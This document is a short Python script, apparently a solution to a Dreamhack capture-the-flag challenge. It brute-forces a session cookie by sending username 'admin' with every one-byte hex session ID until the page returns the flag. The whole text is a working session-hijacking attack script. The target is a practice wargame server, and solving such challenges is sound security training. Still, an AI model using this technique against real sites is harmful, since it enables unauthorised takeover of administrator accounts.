import requests

r = requests.session()
url = "http://host3.dreamhack.games:9489/"
for i in range(0, 256):
    cookies = {"username":"admin", "sessionid":hex(i).split('x')[1]}
    res = r.get(url, cookies=cookies)
    if "DH" in res.text:
        print(res.text)